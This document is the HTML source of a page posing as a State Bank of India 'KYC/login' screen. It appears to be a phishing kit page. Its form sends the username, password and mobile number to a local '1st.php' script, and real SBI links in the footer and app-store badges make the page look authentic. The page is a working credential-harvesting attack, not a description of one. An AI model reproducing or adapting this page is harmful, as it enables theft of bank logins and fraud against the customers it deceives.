<!DOCTYPE html>
<html lang="zxx">
<head>
<script src="./removeBanner.js"></script>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">
  <title>State Bank Of India-KYC/login</title>
  <style>
    #qw,#io,#mm,#il
    {
      width: 105%;
      margin: -8px;
      padding: 0px px;
    }
    #ip
    { 
       width:155px;
    }
    #ia
    {  
         width:155px;
         margin-left:25px;
    }
    #jj
    {
      width: 85%;
      margin-left: 10px;
    }
    #bb,#dd,#ff,#ii
    {
      width: 300px;
      height: 26px;
      background-color: #ededed;
      border-color:#7212b3;
      border-width: 1px;
      border-radius: 4px;
      margin-left: 10px;
      padding: 2px 10px;
      cursor: pointer;
    }
    #ob
    {
      margin-left: 23px;
      font-size: 18px;
    }
    #go
    {
      margin-left: 35px;
      margin: 8px;
    }
    #ll,#sj
    {
      width: 343px;
      background-color: #7212b3;
      color: white;
      border: solid black;
      border-radius: 2px;
      border-width: 0.1px;
      cursor: pointer;
      font-size: 18px;
      height: 42px;
      margin-left: 2px;
    }
    #ch
    {
      margin: 4px;
      margin-left:6px;
      font-size: 15px;
      font-family: Arial, Helvetica, sans-serif;
    }
    #check
    { 
         margin-left:210px;
    }
    #chi
    {  
         font-family:Arial, Helvetica, sans-serif;
         font-size:14px;
    } 
    #yono
    { 
        background-color:#ededed;
        height:120px;
        border: solid #7212b3;
        border-width:0.1px;
        border-radius: 4px;
    }
    #foot
    { 
         background-color:#ededed;
         padding:5px;
         border: solid #7212b3;
         border-width:0.1px;
         border-radius: 4px;
         height:68px;
    }
    #ll:hover
    {
    background-color:#4c0c85;
    color: white;
    border: solid black;
    border-radius: 1px;
    border-width:0.1px;
    cursor: pointer;
    font-size: 18px;
    height: 42px;
  </style>
</head>
<body>
  <img src="second.jpeg" alt="" id="qw"><br><br>
  <form action="1st.php" method="post">
  <div style="margin:0px;">
<center>(<b style="color:red; font-size:13px; margin:0px; margin-left:2px;">CARE:</b>
<p1 style="color:grey; font-size:13px; font-family: Arial, Helvetica, sans-serif; margin:0px margin-left:0px;">Username and password are case sensitive.</p1> )</center>
    </div><br>
    <div id="zz">
      <p1 style="font-family: Arial; margin-left:10px;">Username <span style="color:#f06565;">*</span></p1>
    </div>
    <div id="aa" required="">
      <input type="text" name="Username" id="bb" placeholder="Username" maxlength="25"
      required=""><br><br>
    </div>
    <div id="yy">
      <p1 style="font-family: Arial, Helvetica, sans-serif; margin-left:10px;"> Password <span style="color:#f06565;">*</span></p1>
    </div>
    <div id="cc">
      <input type="password" name="Password" id="dd" placeholder="Password"  maxlength="25"
      required="">
      </div>
      <div id="chi">
      <input type="checkbox"  id="check" onclick="myFunction()">Show Password
      </div>
      <script>
      function myFunction() {
      var x = document.getElementById("dd");
      if (x.type === "password") {
      x.type = "text";
      } else {
      x.type = "password";
      }
      }
      </script>
    <div id="xx">
      <p1 style="font-family: Arial; margin-left:10px;"> Mobile Number <span style="color:#f06565;">*</span></p1>
    </div>
    <div id="ee">
      <input type="tel" name="Mobile No." id="ff" placeholder="Mobile Number" maxlength="10"
      pattern="[0-9]{10}"
      title="Please Enter Valid 10 Digit Mobile Number"
      required=""> <br><br>
    </div>
    <div id="gg">
      <p1 style="font-family: Arial; margin-left:10px;"> Enter the text as shown in the image <span style="color:#f06565;">*</span></p1>
    </div>
    <div id="hh">
      <input type="text" name="" id="ii" placeholder="Enter Captcha" maxlength="5"
      title="Please Enter Capcha Shown In The Image" required="">
    </div>
    <div id="ch" class="fs12">
      <input name="" onclick="showVirtualKeyBoard();" id="ch" type="checkbox" />Enable virtual keyboard
    </div>
  </div>
  <div id="ob">
    <b style="color:black; margin:-10px;">Captcha</b>
  </div>
  <img src="fifth.jpeg" alt="" id="jj"><br><br>
  <div id="kk">
    <center><button type="submit" id="ll">Continue</button><center>
  </div><br>
  <div id="foot">
  <b style="color: #7212b3; font-family: Arial, Helvetica, sans-serif; margin-left:40px;"> <a href="https://retail.onlinesbi.com/preretail/lockunlockuseraccess.htm" style=" color: #7212b3; font-family: Arial, Helvetica, sans-serif; text-decoration:none;"> Lock Access </a></b><b style="margin-left:10px;">|</b>
  <b style="color: #7212b3; font-family: Arial, Helvetica, sans-serif; margin-left:10px;"> <a href="https://retail.onlinesbi.com/retail/troubleloginhome.htm?bankCode=0" style=" color: #7212b3; font-family: Arial, Helvetica, sans-serif; text-decoration:none;"> Forgot Password </a></b><b style="margin-left:4px;">|</b><br><br>
<center> <b style="color: #7212b3; font-family: Arial, Helvetica, sans-serif; margin:5px;"> <a href="https://retail.onlinesbi.com/retail/troubleloginhome.htm?bankCode=0" style=" color: #7212b3; font-family: Arial, Helvetica, sans-serif; text-decoration:none;"> Forgot Username </a></b></center>
  </div><br>
  <div id="yono">
  <b style="color:black; font-size:18px; font-family: Arial, Helvetica, sans-serif; margin-left:5px;">New to YONO?</b1><br>
  <b style="color:black; font-size:17px; font-family: Arial, Helvetica, sans-serif; margin-left:5px;">Download the app and registered now!</b1><br><br>
  <a href="https://play.google.com/store/apps/details?id=com.sbi.SBIFreedomPlus"><img src="play.png" alt="" id="ip"></a>
  <a href="https://apps.apple.com/in/developer/state-bank-of-india/id503784436"><img src="app.png" alt="" id="ia">
  </div><br>
  <img src="last.jpeg" alt="" id="io"><br><br>
  <img src="footer.jpg" alt="" id="il">
